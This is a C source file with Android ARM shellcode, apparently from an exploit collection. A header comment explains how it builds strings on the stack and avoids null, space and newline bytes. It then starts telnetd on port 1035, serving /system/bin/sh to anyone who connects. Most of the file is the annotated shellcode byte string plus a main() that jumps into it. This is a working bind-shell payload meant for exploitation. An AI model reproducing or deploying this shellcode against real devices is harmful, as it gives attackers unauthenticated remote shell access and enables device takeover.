/*
Title:	Android/ARM - telnetd with three parameters and an environment variable
Date: 2015-07-31
Tested on: Android Emulator and Samsung Note 10.1 (Android version 4.1.2)
Author: Steven Padilla - email: spadilla@tresys.com
Organization: Tresys LLC
Vendor HomePage: www.tresys.com
Version: 1.0


Android ARM shellcode with dynamic string creation and including no
0x20, 0x0a and 0x00.

This shellcode will execute telnetd listening on port 1035.  Whenever
anyone connects to port 1035 they will be presented with a shell
prompt.  This code assumes that telnetd and sh are executables in the
/system/bin/ directory.

In order to minimize the length of the shellcode the beginning of the
path /system/bin/ is created once and stored three times.

The executable name (/system/bin/telnetd), the other two paramaters
(-p1035 and -l/system/bin/sh) and the environment variable
(PATH=/system/bin) are strings that are created and stored in memory
above the top of the stack. The strings are created by first moving a
byte to register1, left shitf register1 8 bits, add the next byte,
left shift again, add the next byte, left shift again and then adding
the fourth byte.  Note that due to endianess the bytes are added in
reverse order.  Thus if the string to be created is "/adb" the 'b'
would be moved into r1, followed by the shift and then the 'd' is
added, shift, then the 'a', shift, and finally the '/'.

In the example below the stack pointer has the value 0xbe91da08.

Right before calling the execve call (i.e., svc 1 with register 7 containing
11) register0 is loaded with the 0xbe91da24, register1 is loaded with
the 0xbe91da0c and register2 is loaded with 0xbe91da1c.  The memory
above the stack should look like the following (note to make it easier
to read the strings are presented in the order they appear if you read
them as strings.  If you look at each word you will see the bytes in
reverse order due to endianess) :

               +----------------------------------+
0xbe91da08     | NULL                             |  This is where the stack
               |                                  |  pointer is pointing.
               +----------------------------------+
0xbe91da0c     | 0xbe91da24                       |  These first three entries
               |                                  |  are pointers to the path
               |                                  |  of the executable and its
               |                                  |  two parameters.
               +----------------------------------+
0xbe91da10     | 0xbe91da50                       |
               +----------------------------------+
0xbe91da14     | 0xbe91da5f                       |
               +----------------------------------+
0xbe91da18     | NULL                             | The list of parameters must
               |                                  |  be terminated by a NULL.
               +----------------------------------+
0xbe91da1c     | 0xbe91da88                       | This points to the first
               |                                  | (and only) environment
               |                                  | variable.
               +----------------------------------+
0xbe91da20     | NULL                             | The list of environment
               |                                  | variables must be terminated
               |                                  | by a NULL.
               +----------------------------------+
0xbe91da24     | "//system/bin/telnetd"           | This is where the name of
               |                                  | the executable and the first
               |                                  | parameter is stored.
               +----------------------------------+
0xbe91da50     | "-p1035"                         | This is where the second
               |                                  | parameter is stored.
               +----------------------------------+
0xbe91da5f     | "-l/system/bin/sh"               | This is where the third
               |                                  | parameter is stored.
               +----------------------------------+
0xbe91da88     | "PATH=/system/bin/"              | This is where the first
               |                                  | environment variable is
               |                                  | stored.
               +----------------------------------+

*/

#include <stdio.h>
#include <string.h>

char *SC = 	"\x01\x30\x8f\xe2" //add r3,pc, #1
		"\x13\xff\x2f\xe1" //bx r3
		"\x78\x46"	   //mov r0, pc
		"\x18\x30" 	   //adds r0, 0x18
		"\x92\x1a"	   // subs r2,r2,r2
		"\x49\x1a"         // subs r1, r1, r1

		"\x6a\x44"	   // add r2, sp

		"\x79\x21"	   // mov r1, 'y'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x73\x31"	   // adds r1, 's'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x2f\x31"	   // adds r1, '/'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x2f\x31"	   // adds r1, '/'
		"\x07\x91"	   // str r1, [sp, #4]

		"\x12\x25"	   // mov r5, 0x12
		"\x4d\x40"	   // eor r5,r1
		"\x21\x95"	   // str r5, [sp, #4]

		"\x43\x25"	   // mov r5, 0x43
		"\x4d\x40"	   // eor r5,r1
		"\x16\x95"	   // str r5, [sp, #4]

		"\x6d\x21"	   // mov r1, 'm'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x65\x31"	   // adds r1, 'e'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x74\x31"	   // adds r1, 't'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x73\x31"	   // adds r1, 's'
		"\x08\x91"	   // str r1, [sp, 0x8]
		"\x17\x91"	   // str r1, [sp, 0x17]
		"\x22\x91"	   // str r1, [sp, 0x22]

		"\x6e\x21"	   // mov r1, 'n'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x69\x31"	   // adds r1, 'i'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x62\x31"	   // adds r1, 'b'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x2f\x31"	   // adds r1, '/'
		"\x09\x91"	   // str r1, [sp, 0x9]
		"\x18\x91"	   // str r1, [sp, 0x18]
		"\x23\x91"	   // str r1, [sp, 0x23]

		"\x6c\x21"	   // mov r1, 'l'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x65\x31"	   // adds r1, 'e'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x74\x31"	   // adds r1, 't'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x2f\x31"	   // adds r1, '/'
              	"\x28\x24"         // mov r4, 0x0f
                "\x11\x51"         // str r1, [r2, r4]

		"\x6c\x25"	   // mov r5, 'l'
		"\x2d\x02"	   // LSL r1,r1, #8
		"\x0d\x35"	   // adds r5, 0x0d
		"\x2d\x02"	   // LSL r1,r1, #8
		"\x07\x35"	   // adds r5, 0x07
		"\x2d\x02"	   // LSL r1,r1, #8
		"\x4d\x40"	   // eor r5,r1
		"\x19\x95"	   // str r5, [sp, 0x19]

		"\x64\x21"	   // mov r1, 'd'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x74\x31"	   // adds r1, 't'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x65\x31"	   // adds r1, 'e'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x6e\x31"	   // adds r1, 'n'
		"\x0b\x91"	   // str r1, [sp, 0xb]

		"\x49\x1a"         // subs r1, r1, r1
		"\x0c\x91"	   // str r1, [sp, 0xc]

		"\x30\x21"	   // mov r1, '0'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x31\x31"	   // adds r1, '1'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x70\x31"	   // adds r1, 'p'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x2d\x31"	   // adds r1, '-'
		"\x12\x91"	   // str r1, [sp, #44]

		"\x49\x1a"         // subs r1, r1, r1
		"\x35\x31"	   // add r1, '5'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x33\x31"	   // adds r1, '3'
		"\x13\x91"	   // str r1, [sp, 0x13]

		"\x49\x1a"         // subs r1, r1, r1
		"\x14\x91"	   // str r1, [sp, 0x14]

		"\x2d\x21"	   // mov r1, '-'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x09\x02"	   // LSL r1,r1, #8
		"\x09\x02"	   // LSL r1,r1, #8
		"\x15\x91"	   // str r1, [sp, 0x15]

		"\x49\x1a"         // subs r1, r1, r1
		"\x1f\x91"	   // str r1, [sp, 0x1f]

		"\x48\x21"	   // mov r1, 'H'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x54\x31"	   // adds r1, 'T'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x41\x31"	   // adds r1, 'A'
		"\x09\x02"	   // LSL r1,r1, #8
		"\x50\x31"	   // adds r1, 'P'
		"\x80\x24"         // mov r4, 0x0f
                "\x11\x51"         // str r1, [r2, r4]

		"\x2f\x21"	   // mov r1, '/'
		"\x24\x91"	   // str r1, [sp, 0x24]

		"\x04\x32"	   // add r2, 0x4

		"\x49\x1a"         // subs r1, r1, r1
		"\x11\x1c"	   // add r1, r2, #0
		"\x18\x31"	   // add r1, 0x18
		"\x01\x91"	   // str r1, [sp, 0x1]

		"\x2c\x31"	   // add r1, #40
		"\x02\x91"	   // str r1, [sp, 0x2]

		"\x0f\x31"	   // add r1, #4
		"\x03\x91"	   // str r1, [sp, 0x3]

		"\x29\x31"	   // add r1, #28
		"\x05\x91"	   // str r1, [sp, #0x5]

		"\x49\x1a"         // subs r1, r1, r1
		"\x04\x91"         // str r1, [sp, 0x4]

		"\x06\x91"         // str r1, [sp, 0x6]

		"\x10\x1c"	   // add r0, r2, #0
		"\x18\x30"	   // add r0, 0x18

		"\x11\x1c"	   // add r1, r2, #0

		"\x10\x32"	   // adds r2, 0x10

		"\xdb\x1a"         // subs r3, r3, r3


		"\x0b\x27"	   //movs r7,#11
		"\x01\xdf";	   //svc 1

int main(void)
{
	(*(void(*) ()) SC) ();
	return 0;
}